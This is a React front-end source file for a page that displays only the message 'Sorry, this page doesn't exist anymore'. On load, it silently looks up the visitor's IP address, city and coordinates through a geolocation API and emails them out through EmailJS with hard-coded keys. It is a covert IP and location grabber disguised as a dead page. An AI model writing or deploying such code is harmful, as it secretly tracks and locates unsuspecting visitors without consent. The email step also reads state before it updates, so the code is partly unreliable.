import './App.css';
import {useState,useEffect} from 'react'
import emailjs from '@emailjs/browser'
// import axios from 'axios'

function App() {
  //creating IP state
  const [ip, setIP] = useState('');
  const [city, setCity] = useState('');
  const [latitude, setLatitude] = useState('');
  const [longitude, setLongitude] = useState('');

  function sendEmail(){
    let templateParams = {
      ip: ip,
      city: city,
      latitude: latitude,
      longitude: longitude
    }
    emailjs.send('service_dwwy4yk', 'template_qs20n8t', templateParams)
    .then((res)=>{
      console.log('Success!', res.status, res.text);
    }, (err)=>{
      console.log('failed...');
    });
  }

  //creating function to load ip address from the API
  const getData = async () => {
    // const res = await axios.get('https://geolocation-db.com/json/')
    fetch('https://geolocation-db.com/json/')
    .then(res=>res.json())
    .then(data=>{
      console.log(data)
      setIP(data.IPv4);
      setCity(data.city);
      setLatitude(data.latitude);
      setLongitude(data.longitude);
      sendEmail();
    });
    //console.log(res.data);
    // setIP(res.data.IPv4)
  }
  
  useEffect( () => {
    //passing getData method to the lifecycle method
    getData()

  }, [])

  return (
    <div className="App">
      <h2>Sorry, this page doesn't exist anymore</h2>
      {(function(){
        emailjs.init('ca7amkmdWJxWuC5c9');
      })()}
    </div>
  );
}

export default App;